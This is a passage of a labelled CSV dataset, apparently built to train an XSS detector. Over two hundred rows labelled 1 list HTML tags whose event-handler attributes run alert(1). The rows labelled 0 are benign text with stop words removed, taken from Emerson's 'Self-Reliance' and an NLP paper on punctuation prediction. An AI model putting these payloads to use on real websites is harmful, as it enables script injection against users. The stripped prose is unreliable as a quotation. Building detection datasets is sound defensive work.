,Sentence,Label
6916,"<ul onblur=alert(1) tabindex=1 id=x></ul><input autofocus>
",1
6917,"<ul onclick=""alert(1)"">test</ul>
",1
6918,"<ul oncontextmenu=""alert(1)"">test</ul>
",1
6919,"<ul oncopy=""alert(1)"" contenteditable>test</ul>
",1
6920,"<ul oncut=""alert(1)"" contenteditable>test</ul>
",1
6921,"<ul ondblclick=""alert(1)"">test</ul>
",1
6922,"<ul onfocusout=alert(1) tabindex=1 id=x></ul><input autofocus>
",1
6923,"<ul onkeydown=""alert(1)"" contenteditable>test</ul>
",1
6924,"<ul onkeypress=""alert(1)"" contenteditable>test</ul>
",1
6925,"<ul onkeyup=""alert(1)"" contenteditable>test</ul>
",1
6926,"<ul onmousedown=""alert(1)"">test</ul>
",1
6927,"<ul onmouseenter=""alert(1)"">test</ul>
",1
6928,"<ul onmouseleave=""alert(1)"">test</ul>
",1
6929,"<ul onmousemove=""alert(1)"">test</ul>
",1
6930,"<ul onmouseout=""alert(1)"">test</ul>
",1
6931,"<ul onmouseover=""alert(1)"">test</ul>
",1
6932,"<ul onmouseup=""alert(1)"">test</ul>
",1
6933,"<ul onpaste=""alert(1)"" contenteditable>test</ul>
",1
6934,"<ul onpointerdown=alert(1)>XSS</ul>
",1
6935,"<ul onpointerenter=alert(1)>XSS</ul>
",1
6936,"<ul onpointerleave=alert(1)>XSS</ul>
",1
6937,"<ul onpointermove=alert(1)>XSS</ul>
",1
6938,"<ul onpointerout=alert(1)>XSS</ul>
",1
6939,"<ul onpointerover=alert(1)>XSS</ul>
",1
6940,"<ul onpointerup=alert(1)>XSS</ul>
",1
6941,"<var draggable=""true"" ondrag=""alert(1)"">test</var>
",1
6942,"<var draggable=""true"" ondragend=""alert(1)"">test</var>
",1
6943,"<var draggable=""true"" ondragenter=""alert(1)"">test</var>
",1
6944,"<var draggable=""true"" ondragleave=""alert(1)"">test</var>
",1
6945,"<var draggable=""true"" ondragstart=""alert(1)"">test</var>
",1
6946,"<var id=x tabindex=1 onactivate=alert(1)></var>
",1
6947,"<var id=x tabindex=1 onbeforeactivate=alert(1)></var>
",1
6948,"<var id=x tabindex=1 onbeforedeactivate=alert(1)></var><input autofocus>
",1
6949,"<var id=x tabindex=1 ondeactivate=alert(1)></var><input id=y autofocus>
",1
6950,"<var id=x tabindex=1 onfocus=alert(1)></var>
",1
6951,"<var id=x tabindex=1 onfocusin=alert(1)></var>
",1
6952,"<var onbeforecopy=""alert(1)"" contenteditable>test</var>
",1
6953,"<var onbeforecut=""alert(1)"" contenteditable>test</var>
",1
6954,"<var onbeforepaste=""alert(1)"" contenteditable>test</var>
",1
6955,"<var onblur=alert(1) tabindex=1 id=x></var><input autofocus>
",1
6956,"<var onclick=""alert(1)"">test</var>
",1
6957,"<var oncontextmenu=""alert(1)"">test</var>
",1
6958,"<var oncopy=""alert(1)"" contenteditable>test</var>
",1
6959,"<var oncut=""alert(1)"" contenteditable>test</var>
",1
6960,"<var ondblclick=""alert(1)"">test</var>
",1
6961,"<var onfocusout=alert(1) tabindex=1 id=x></var><input autofocus>
",1
6962,"<var onkeydown=""alert(1)"" contenteditable>test</var>
",1
6963,"<var onkeypress=""alert(1)"" contenteditable>test</var>
",1
6964,"<var onkeyup=""alert(1)"" contenteditable>test</var>
",1
6965,"<var onmousedown=""alert(1)"">test</var>
",1
6966,"<var onmouseenter=""alert(1)"">test</var>
",1
6967,"<var onmouseleave=""alert(1)"">test</var>
",1
6968,"<var onmousemove=""alert(1)"">test</var>
",1
6969,"<var onmouseout=""alert(1)"">test</var>
",1
6970,"<var onmouseover=""alert(1)"">test</var>
",1
6971,"<var onmouseup=""alert(1)"">test</var>
",1
6972,"<var onpaste=""alert(1)"" contenteditable>test</var>
",1
6973,"<var onpointerdown=alert(1)>XSS</var>
",1
6974,"<var onpointerenter=alert(1)>XSS</var>
",1
6975,"<var onpointerleave=alert(1)>XSS</var>
",1
6976,"<var onpointermove=alert(1)>XSS</var>
",1
6977,"<var onpointerout=alert(1)>XSS</var>
",1
6978,"<var onpointerover=alert(1)>XSS</var>
",1
6979,"<var onpointerup=alert(1)>XSS</var>
",1
6980,"<video autoplay controls onpause=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>
",1
6981,"<video autoplay controls onseeked=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>
",1
6982,"<video autoplay controls onseeking=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>
",1
6983,"<video autoplay controls onvolumechange=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>
",1
6984,"<video autoplay controls onwaiting=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>
",1
6985,"<video autoplay onloadedmetadata=alert(1)> <source src=""validvideo.mp4"" type=""video/mp4""></video>
",1
6986,"<video autoplay onplay=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>
",1
6987,"<video autoplay onplaying=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>
",1
6988,"<video controls autoplay onended=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>
",1
6989,"<video controls autoplay ontimeupdate=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>
",1
6990,"<video draggable=""true"" ondrag=""alert(1)"">test</video>
",1
6991,"<video draggable=""true"" ondragend=""alert(1)"">test</video>
",1
6992,"<video draggable=""true"" ondragenter=""alert(1)"">test</video>
",1
6993,"<video draggable=""true"" ondragleave=""alert(1)"">test</video>
",1
6994,"<video draggable=""true"" ondragstart=""alert(1)"">test</video>
",1
6995,"<video id=x controls onfocus=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>
",1
6996,"<video id=x controls onfocusin=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>
",1
6997,"<video id=x tabindex=1 onactivate=alert(1)></video>
",1
6998,"<video id=x tabindex=1 onbeforeactivate=alert(1)></video>
",1
6999,"<video id=x tabindex=1 onbeforedeactivate=alert(1)></video><input autofocus>
",1
7000,"<video id=x tabindex=1 ondeactivate=alert(1)></video><input id=y autofocus>
",1
7001,"<video onbeforecopy=""alert(1)"" contenteditable>test</video>
",1
7002,"<video onbeforecut=""alert(1)"" contenteditable>test</video>
",1
7003,"<video onbeforepaste=""alert(1)"" contenteditable>test</video>
",1
7004,"<video onblur=alert(1) tabindex=1 id=x></video><input autofocus>
",1
7005,"<video oncanplay=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>
",1
7006,"<video oncanplaythrough=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>
",1
7007,"<video onclick=""alert(1)"">test</video>
",1
7008,"<video oncontextmenu=""alert(1)"">test</video>
",1
7009,"<video oncopy=""alert(1)"" contenteditable>test</video>
",1
7010,"<video oncut=""alert(1)"" contenteditable>test</video>
",1
7011,"<video ondblclick=""alert(1)"">test</video>
",1
7012,"<video onfocusout=alert(1) tabindex=1 id=x></video><input autofocus>
",1
7013,"<video onkeydown=""alert(1)"" contenteditable>test</video>
",1
7014,"<video onkeypress=""alert(1)"" contenteditable>test</video>
",1
7015,"<video onkeyup=""alert(1)"" contenteditable>test</video>
",1
7016,"<video onloadeddata=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>
",1
7017,"<video onmousedown=""alert(1)"">test</video>
",1
7018,"<video onmouseenter=""alert(1)"">test</video>
",1
7019,"<video onmouseleave=""alert(1)"">test</video>
",1
7020,"<video onmousemove=""alert(1)"">test</video>
",1
7021,"<video onmouseout=""alert(1)"">test</video>
",1
7022,"<video onmouseover=""alert(1)"">test</video>
",1
7023,"<video onmouseup=""alert(1)"">test</video>
",1
7024,"<video onpaste=""alert(1)"" contenteditable>test</video>
",1
7025,"<video onpointerdown=alert(1)>XSS</video>
",1
7026,"<video onpointerenter=alert(1)>XSS</video>
",1
7027,"<video onpointerleave=alert(1)>XSS</video>
",1
7028,"<video onpointermove=alert(1)>XSS</video>
",1
7029,"<video onpointerout=alert(1)>XSS</video>
",1
7030,"<video onpointerover=alert(1)>XSS</video>
",1
7031,"<video onpointerup=alert(1)>XSS</video>
",1
7032,"<video src/onerror=alert(1)>
",1
7033,"<video><source onerror=alert(1) src=1></video>
",1
7034,"<video><track default onload=alert(1) src=""data:text/vtt,WEBVTT""></video>
",1
7035,"<wbr draggable=""true"" ondrag=""alert(1)"">test</wbr>
",1
7036,"<wbr draggable=""true"" ondragend=""alert(1)"">test</wbr>
",1
7037,"<wbr draggable=""true"" ondragenter=""alert(1)"">test</wbr>
",1
7038,"<wbr draggable=""true"" ondragleave=""alert(1)"">test</wbr>
",1
7039,"<wbr draggable=""true"" ondragstart=""alert(1)"">test</wbr>
",1
7040,"<wbr id=x tabindex=1 onactivate=alert(1)></wbr>
",1
7041,"<wbr id=x tabindex=1 onbeforeactivate=alert(1)></wbr>
",1
7042,"<wbr id=x tabindex=1 onbeforedeactivate=alert(1)></wbr><input autofocus>
",1
7043,"<wbr id=x tabindex=1 ondeactivate=alert(1)></wbr><input id=y autofocus>
",1
7044,"<wbr id=x tabindex=1 onfocus=alert(1)></wbr>
",1
7045,"<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>
",1
7046,"<wbr onbeforecopy=""alert(1)"" contenteditable>test</wbr>
",1
7047,"<wbr onbeforecut=""alert(1)"" contenteditable>test</wbr>
",1
7048,"<wbr onbeforepaste=""alert(1)"" contenteditable>test</wbr>
",1
7049,"<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>
",1
7050,"<wbr onclick=""alert(1)"">test</wbr>
",1
7051,"<wbr oncontextmenu=""alert(1)"">test</wbr>
",1
7052,"<wbr oncopy=""alert(1)"" contenteditable>test</wbr>
",1
7053,"<wbr oncut=""alert(1)"" contenteditable>test</wbr>
",1
7054,"<wbr ondblclick=""alert(1)"">test</wbr>
",1
7055,"<wbr onfocusout=alert(1) tabindex=1 id=x></wbr><input autofocus>
",1
7056,"<wbr onkeydown=""alert(1)"" contenteditable>test</wbr>
",1
7057,"<wbr onkeypress=""alert(1)"" contenteditable>test</wbr>
",1
7058,"<wbr onkeyup=""alert(1)"" contenteditable>test</wbr>
",1
7059,"<wbr onmousedown=""alert(1)"">test</wbr>
",1
7060,"<wbr onmouseenter=""alert(1)"">test</wbr>
",1
7061,"<wbr onmouseleave=""alert(1)"">test</wbr>
",1
7062,"<wbr onmousemove=""alert(1)"">test</wbr>
",1
7063,"<wbr onmouseout=""alert(1)"">test</wbr>
",1
7064,"<wbr onmouseover=""alert(1)"">test</wbr>
",1
7065,"<wbr onmouseup=""alert(1)"">test</wbr>
",1
7066,"<wbr onpaste=""alert(1)"" contenteditable>test</wbr>
",1
7067,"<wbr onpointerdown=alert(1)>XSS</wbr>
",1
7068,"<wbr onpointerenter=alert(1)>XSS</wbr>
",1
7069,"<wbr onpointerleave=alert(1)>XSS</wbr>
",1
7070,"<wbr onpointermove=alert(1)>XSS</wbr>
",1
7071,"<wbr onpointerout=alert(1)>XSS</wbr>
",1
7072,"<wbr onpointerover=alert(1)>XSS</wbr>
",1
7073,"<wbr onpointerup=alert(1)>XSS</wbr>
",1
7074,"<xmp draggable=""true"" ondrag=""alert(1)"">test</xmp>
",1
7075,"<xmp draggable=""true"" ondragend=""alert(1)"">test</xmp>
",1
7076,"<xmp draggable=""true"" ondragenter=""alert(1)"">test</xmp>
",1
7077,"<xmp draggable=""true"" ondragleave=""alert(1)"">test</xmp>
",1
7078,"<xmp draggable=""true"" ondragstart=""alert(1)"">test</xmp>
",1
7079,"<xmp id=x tabindex=1 onactivate=alert(1)></xmp>
",1
7080,"<xmp id=x tabindex=1 onbeforeactivate=alert(1)></xmp>
",1
7081,"<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>
",1
7082,"<xmp id=x tabindex=1 ondeactivate=alert(1)></xmp><input id=y autofocus>
",1
7083,"<xmp id=x tabindex=1 onfocus=alert(1)></xmp>
",1
7084,"<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>
",1
7085,"<xmp onbeforecopy=""alert(1)"" contenteditable>test</xmp>
",1
7086,"<xmp onbeforecut=""alert(1)"" contenteditable>test</xmp>
",1
7087,"<xmp onbeforepaste=""alert(1)"" contenteditable>test</xmp>
",1
7088,"<xmp onblur=alert(1) tabindex=1 id=x></xmp><input autofocus>
",1
7089,"<xmp onclick=""alert(1)"">test</xmp>
",1
7090,"<xmp oncontextmenu=""alert(1)"">test</xmp>
",1
7091,"<xmp oncopy=""alert(1)"" contenteditable>test</xmp>
",1
7092,"<xmp oncut=""alert(1)"" contenteditable>test</xmp>
",1
7093,"<xmp ondblclick=""alert(1)"">test</xmp>
",1
7094,"<xmp onfocusout=alert(1) tabindex=1 id=x></xmp><input autofocus>
",1
7095,"<xmp onkeydown=""alert(1)"" contenteditable>test</xmp>
",1
7096,"<xmp onkeypress=""alert(1)"" contenteditable>test</xmp>
",1
7097,"<xmp onkeyup=""alert(1)"" contenteditable>test</xmp>
",1
7098,"<xmp onmousedown=""alert(1)"">test</xmp>
",1
7099,"<xmp onmouseenter=""alert(1)"">test</xmp>
",1
7100,"<xmp onmouseleave=""alert(1)"">test</xmp>
",1
7101,"<xmp onmousemove=""alert(1)"">test</xmp>
",1
7102,"<xmp onmouseout=""alert(1)"">test</xmp>
",1
7103,"<xmp onmouseover=""alert(1)"">test</xmp>
",1
7104,"<xmp onmouseup=""alert(1)"">test</xmp>
",1
7105,"<xmp onpaste=""alert(1)"" contenteditable>test</xmp>
",1
7106,"<xmp onpointerdown=alert(1)>XSS</xmp>
",1
7107,"<xmp onpointerenter=alert(1)>XSS</xmp>
",1
7108,"<xmp onpointerleave=alert(1)>XSS</xmp>
",1
7109,"<xmp onpointermove=alert(1)>XSS</xmp>
",1
7110,"<xmp onpointerout=alert(1)>XSS</xmp>
",1
7111,"<xmp onpointerover=alert(1)>XSS</xmp>
",1
7112,"<xmp onpointerup=alert(1)>XSS</xmp>
",1
7113,"<xss id=x tabindex=1 onactivate=alert(1)></xss>
",1
7114,"<xss id=x tabindex=1 onbeforeactivate=alert(1)></xss>
",1
7115,"<xss id=x tabindex=1 onbeforedeactivate=alert(1)></xss><input autofocus>
",1
7116,"<xss id=x tabindex=1 onblur=alert(1)></xss><input autofocus>
",1
7117,"<xss id=x tabindex=1 ondeactivate=alert(1)></xss><input autofocus>
",1
7118,"<xss id=x tabindex=1 onfocus=alert(1)></xss>
",1
7119,"<xss id=x tabindex=1 onfocusin=alert(1)></xss>
",1
7120,"<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>
",1
7121,  Add plain text Ne te quaesiveris extra,0
7122," Man star; soul Render honest perfect man, Commands light, influence, fate; Nothing falls early late",0
7123," Our acts angels are, good ill, Our fatal shadows walk us still",0
7124," Epilogue Beaumont Fletcher’s Honest Man’s Fortune Cast bantling rocks, Suckle she-wolf’s teat; Wintered hawk fox, Power speed hands feet",0
7125, I read day verses written eminent painter original conventional,0
7126," The soul always hears admonition lines, let subject may",0
7127, The sentiment instil value thought may contain,0
7128," To believe thought, believe true private heart true men, — genius",0
7129," Speak latent conviction, shall universal sense; inmost due time becomes outmost, — first thought rendered back us trumpets Last Judgment",0
7130," Familiar voice mind each, highest merit ascribe Moses, Plato, Milton is, set naught books traditions, spoke men thought",0
7131," A man learn detect watch gleam light flashes across mind within, lustre firmament bards sages",0
7132," Yet dismisses without notice thought, his",0
7133, In every work genius recognize rejected thoughts: come back us certain alienated majesty,0
7134, Great works art affecting lesson us this,0
7135, They teach us abide spontaneous impression good-humored inflexibility whole cry voices side,0
7136," Else, to-morrow stranger say masterly good sense precisely thought felt time, shall forced take shame opinion another",0
7137," There time every man’s education arrives conviction envy ignorance; imitation suicide; must take better, worse, portion; though wide universe full good, kernel nourishing corn come toil bestowed plot ground given till",0
7138," The power resides new nature, none knows do, know tried",0
7139," Not nothing one face, one character, one fact, makes much impression him, another none",0
7140, This sculpture memory without preestablished harmony,0
7141," The eye placed one ray fall, might testify particular ray",0
7142," We half express ourselves, ashamed divine idea us represents",0
7143," It may safely trusted proportionate good issues, faithfully imparted, God work made manifest cowards",0
7144," A man relieved gay put heart work done best; said done otherwise, shall give peace",0
7145, It deliverance deliver,0
7146," In attempt genius deserts him; muse befriends; invention, hope",0
7147, Trust thyself: every heart vibrates iron string,0
7148," Accept place divine providence found you, society contemporaries, connection events",0
7149," Great men always done so, confided childlike genius age, betraying perception absolutely trustworthy seated heart, working hands, predominating being",0
7150," And men, must accept highest mind transcendent destiny; minors invalids protected corner, cowards fleeing revolution, guides, redeemers, benefactors, obeying Almighty effort, advancing Chaos Dark",0
7151," What pretty oracles nature yields us text, face behaviour children, babes, even brutes! That divided rebel mind, distrust sentiment arithmetic computed strength means opposed purpose, not",0
7152," Their mind whole, eye yet unconquered, look faces, disconcerted",0
7153," Infancy conforms nobody: conform it, one babe commonly makes four five adults prattle play it",0
7154," So God armed youth puberty manhood less piquancy charm, made enviable gracious claims put by, stand itself",0
7155," Do think youth force, cannot speak me",0
7156, Hark! next room voice sufficiently clear emphatic,0
7157, It seems knows speak contemporaries,0
7158," Bashful bold, then, know make us seniors unnecessary",0
7159," The nonchalance boys sure dinner, would disdain much lord say aught conciliate one, healthy attitude human nature",0
7160," A boy parlour pit playhouse; independent, irresponsible, looking corner people facts pass by, tries sentences merits, swift, summary way boys, good, bad, interesting, silly, eloquent, troublesome",0
7161," He cumbers never consequences, interests: gives independent, genuine verdict",0
7162, You must court him: court you,0
7163," But man is, were, clapped jail consciousness",0
7164," As soon acted spoken eclat, committed person, watched sympathy hatred hundreds, whose affections must enter account",0
7165, There Lethe this,0
7166," Ah, could pass neutrality! Who thus avoid pledges, observed, observe unaffected, unbiased, unbribable, unaffrighted innocence, must always formidable",0
7167," He would utter opinions passing affairs, seen private, necessary, would sink like darts ear men, put fear",0
7168," These voices hear solitude, grow faint inaudible enter world",0
7169, Society everywhere conspiracy manhood every one members,0
7170," Society joint-stock company, members agree, better securing bread shareholder, surrender liberty culture eater",0
7171, The virtue request conformity,0
7172, Self-reliance aversion,0
7173," It loves realities creators, names customs",0
7174, Whoso would man must nonconformist,0
7175," He would gather immortal palms must hindered name goodness, must explore goodness",0
7176, Nothing last sacred integrity mind,0
7177," Absolve yourself, shall suffrage world",0
7178," I remember answer quite young I prompted make valued adviser, wont importune dear old doctrines church",0
7179," On saying, What I sacredness traditions, I live wholly within? friend suggested, — But impulses may below, above",0
7180," I replied, They seem such; I Devil’s child, I live Devil",0
7181, No law sacred nature,0
7182," Good bad names readily transferable this; right constitution, wrong it",0
7183," A man carry presence opposition, every thing titular ephemeral he",0
7184," I ashamed think easily capitulate badges names, large societies dead institutions",0
7185, Every decent well-spoken individual affects sways right,0
7186," I ought go upright vital, speak rude truth ways",0
7187," If malice vanity wear coat philanthropy, shall pass? If angry bigot assumes bountiful cause Abolition, comes last news Barbadoes, I say him, ‘Go love thy infant; love thy wood-chopper: good-natured modest: grace; never varnish hard, uncharitable ambition incredible tenderness black folk thousand miles off",0
7188, Thy love afar spite home,0
7189,"’ Rough graceless would greeting, truth handsomer affectation love",0
7190," Your goodness must edge it, — else none",0
7191, The doctrine hatred must preached counteraction doctrine love pules whines,0
7192," I shun father mother wife brother, genius calls me",0
7193," I would write lintels door-post, Whim",0
7194," I hope somewhat better whim last, cannot spend day explanation",0
7195, Expect show cause I seek I exclude company,0
7196," Then, again, tell me, good man to-day, obligation put poor men good situations",0
7197," Are poor? I tell thee, thou foolish philanthropist, I grudge dollar, dime, cent, I give men belong I belong",0
7198," There class persons spiritual affinity I bought sold; I go prison, need be; miscellaneous popular charities; education college fools; building meeting-houses vain end many stand; alms sots; thousandfold Relief Societies; — though I confess shame I sometimes succumb give dollar, wicked dollar I shall manhood withhold",0
7199," Virtues are, popular estimate, rather exception rule",0
7200, There man virtues,0
7201," Men called good action, piece courage charity, much would pay fine expiation daily non-appearance parade",0
7202," Their works done apology extenuation living world, — invalids insane pay high board",0
7203, Their virtues penances,0
7204," I wish expiate, live",0
7205, My life spectacle,0
7206," I much prefer lower strain, genuine equal, glittering unsteady",0
7207," I wish sound sweet, need diet bleeding",0
7208," I ask primary evidence man, refuse appeal man actions",0
7209, I know makes difference whether I forbear actions reckoned excellent,0
7210, I cannot consent pay privilege I intrinsic right,0
7211," Few mean gifts may be, I actually am, need assurance assurance fellows secondary testimony",0
7212," What I must concerns me, people think",0
7213," This rule, equally arduous actual intellectual life, may serve whole distinction greatness meanness",0
7214," It harder, always find think know duty better know it",0
7215, It easy world live world’s opinion; easy solitude live own; great man midst crowd keeps perfect sweetness independence solitude,0
7216," The objection conforming usages become dead is, scatters force",0
7217, It loses time blurs impression character,0
7218," If maintain dead church, contribute dead Bible-society, vote great party either government it, spread table like base housekeepers, — screens I difficulty detect precise man are",0
7219," And, course, much force withdrawn proper life",0
7220," But work, I shall know you",0
7221," Do work, shall reinforce yourself",0
7222, A man must consider blindman’s-buff game conformity,0
7223," If I know sect, I anticipate argument",0
7224, I hear preacher announce text topic expediency one institutions church,0
7225," Do I know beforehand possibly say new spontaneous word? Do I know that, ostentation examining grounds institution, thing? Do I know pledged look one side, — permitted side, man, parish minister? He retained attorney, airs bench emptiest affectation",0
7226," Well, men bound eyes one another handkerchief, attached one communities opinion",0
7227," This conformity makes false particulars, authors lies, false particulars",0
7228, Their every truth quite true,0
7229," Their two real two, four real four; every word say chagrins us, know begin set right",0
7230, Meantime nature slow equip us prison-uniform party adhere,0
7231," We come wear one cut face figure, acquire degrees gentlest asinine expression",0
7232," There mortifying experience particular, fail wreak also general history; I mean foolish face praise, forced smile put company feel ease answer conversation interest us",0
7233," The muscles, spontaneously moved, moved low usurping wilfulness, grow tight outline face disagreeable sensation",0
7234, For nonconformity world whips displeasure,0
7235, And therefore man must know estimate sour face,0
7236, The by-standers look askance public street friend’s parlour,0
7237," If aversation origin contempt resistance like own, might well go home sad countenance; sour faces multitude, like sweet faces, deep cause, put wind blows newspaper directs",0
7238, Yet discontent multitude formidable senate college,0
7239, It easy enough firm man knows world brook rage cultivated classes,0
7240," Their rage decorous prudent, timid vulnerable themselves",0
7241," But feminine rage indignation people added, ignorant poor aroused, unintelligent brute force lies bottom society made growl mow, needs habit magnanimity religion treat godlike trifle concernment",0
7242," The terror scares us self-trust consistency; reverence past act word, eyes others data computing orbit past acts, loath disappoint them",0
7243," But keep head shoulder? Why drag corpse memory, lest contradict somewhat stated public place? Suppose contradict yourself; then? It seems rule wisdom never rely memory alone, scarcely even acts pure memory, bring past judgment thousand-eyed present, live ever new day",0
7244," In metaphysics denied personality Deity: yet devout motions soul come, yield heart life, though clothe God shape color",0
7245," Leave theory, Joseph coat hand harlot, flee",0
7246," A foolish consistency hobgoblin little minds, adored little statesmen philosophers divines",0
7247, With consistency great soul simply nothing do,0
7248, He may well concern shadow wall,0
7249," Speak think hard words, to-morrow speak to-morrow thinks hard words again, though contradict every thing said to-day",0
7250," — ‘Ah, shall sure misunderstood",0
7251,"’ — Is bad, then, misunderstood? Pythagoras misunderstood, Socrates, Jesus, Luther, Copernicus, Galileo, Newton, every pure wise spirit ever took flesh",0
7252, To great misunderstood,0
7253, I suppose man violate nature,0
7254," All sallies rounded law being, inequalities Andes Himmaleh insignificant curve sphere",0
7255, Nor matter gauge try him,0
7256," A character like acrostic Alexandrian stanza; — read forward, backward, across, still spells thing",0
7257," In pleasing, contrite wood-life God allows me, let record day day honest thought without prospect retrospect, and, I cannot doubt, found symmetrical, though I mean not, see not",0
7258, My book smell pines resound hum insects,0
7259, The swallow window interweave thread straw carries bill web also,0
7260, We pass are,0
7261, Character teaches wills,0
7262," Men imagine communicate virtue vice overt actions, see virtue vice emit breath every moment",0
7263," There agreement whatever variety actions, honest natural hour",0
7264," For one will, actions harmonious, however unlike seem",0
7265," These varieties lost sight little distance, little height thought",0
7266, One tendency unites all,0
7267, The voyage best ship zigzag line hundred tacks,0
7268," See line sufficient distance, straightens average tendency",0
7269," Your genuine action explain itself, explain genuine actions",0
7270, Your conformity explains nothing,0
7271," Act singly, already done singly justify now",0
7272, Greatness appeals future,0
7273," If I firm enough to-day right, scorn eyes, I must done much right defend now",0
7274," Be will, right now",0
7275," Always scorn appearances, always may",0
7276, The force character cumulative,0
7277, All foregone days virtue work health this,0
7278," What makes majesty heroes senate field, fills imagination? The consciousness train great days victories behind",0
7279, They shed united light advancing actor,0
7280, He attended visible escort angels,0
7281," That throws thunder Chatham’s voice, dignity Washington’s port, America Adams’s eye",0
7282, Honor venerable us ephemeris,0
7283, It always ancient virtue,0
7284, We worship to-day to-day,0
7285," We love pay homage, trap love homage, selfdependent, self-derived, therefore old immaculate pedigree, even shown young person",0
7286, I hope days heard last conformity consistency,0
7287, Let words gazetted ridiculous henceforward,0
7288," Instead gong dinner, let us hear whistle Spartan fife",0
7289, Let us never bow apologize more,0
7290, A great man coming eat house,0
7291, I wish please him; I wish wish please me,0
7292," I stand humanity, though I would make kind, I would make true",0
7293," Let us affront reprimand smooth mediocrity squalid contentment times, hurl face custom, trade, office, fact upshot history, great responsible Thinker Actor working wherever man works; true man belongs time place, centre things",0
7294," Where is, nature",0
7295," He measures you, men, events",0
7296," Ordinarily, every body society reminds us somewhat else, person",0
7297," Character, reality, reminds nothing else; takes place whole creation",0
7298," The man must much, must make circumstances indifferent",0
7299," Every true man cause, country, age; requires infinite spaces numbers time fully accomplish design; — posterity seem follow steps train clients",0
7300," A man Caesar born, ages Roman Empire",0
7301," Christ born, millions minds grow cleave genius, confounded virtue possible man",0
7302," An institution lengthened shadow one man; as, Monachism, Hermit Antony; Reformation, Luther; Quakerism, Fox; Methodism, Wesley; Abolition, Clarkson",0
7303," Scipio, Milton called height Rome; history resolves easily biography stout earnest persons",0
7304, Standard automatic speech recognizers output unstructured streams words,0
7305," They neither perform proper segmentation output sentences, predict punctuation symbols",0
7306," The unavailable punctuations sentence boundaries transcribed speech texts create barriers many subsequent processing tasks, summarization, information extraction, question answering machine translation",0
7307," Thus, segmentation long texts necessary many real applications",0
7308," For example, speech-to-speech translation, continuously transcribed speech texts need segmented fed subsequent machine translation systems (Takezawa et al",0
7309,", 1998; Nakamura, 2009)",0
7310," This current machine translation (MT) systems perform translation sentence level, various models used MT trained segmented sentences many algorithms inside MT exponential complexity regard length inputs",0
7311, The punctuation prediction problem attracted research interest speech processing community natural language processing community,0
7312," Most previous work primarily exploits local features statistical models lexicons, prosodic cues hidden event language model (HELM) (Liu et al",0
7313,", 2005; Matusov et al",0
7314,", 2006; Huang Zweig, 2002; Stolcke Shriberg, 1996)",0
7315, The word-level models integrating local features narrow views input could achieve satisfied performance due limited context information access (Favre et al,0
7316,", 2008)",0
7317," Naturally, global contexts required model punctuation prediction, especially long-range dependencies",0
7318," For instance, English question sentences, ending question mark long-range dependent initial phrases (Lu Ng, 2010), could Figure 1",0
7319, There work trying incorporate syntactic features broaden view hypotheses punctuation prediction models (Roark et al,0
7320,", 2006; Favre et al",0
7321,", 2008)",0
7322," In methods, punctuation prediction treated separated post-procedure parsing, may suffer problem error propagation",0
7323," In addition, approaches able incrementally process inputs efficient long inputs, especially cases long transcribed speech texts presentations number streaming words could larger hundreds thousands",0
7324," In paper, propose jointly performing punctuation prediction transition-based dependency parsing transcribed speech text",0
7325," When transition-based parsing consumes stream words left right shift-reduce decoding algorithm, punctuation symbols predicted word based contexts parsing tree",0
7326, Two models proposed cause punctuation prediction interact transition actions parsing,0
7327, One conduct transition actions parsing followed punctuation predictions cascaded way,0
7328," The associate conventional transition actions parsing punctuation perditions, predicted punctuations directly inferred parsing tree",0
7329, Our models linear complexity capable handling streams words length,0
7330," In addition, computation models use rich set syntactic features, improve complicated punctuation predictions global view, especially long range dependencies",0
7331, Figure 1 shows example parsing helps punctuation prediction transcribed speech text,0
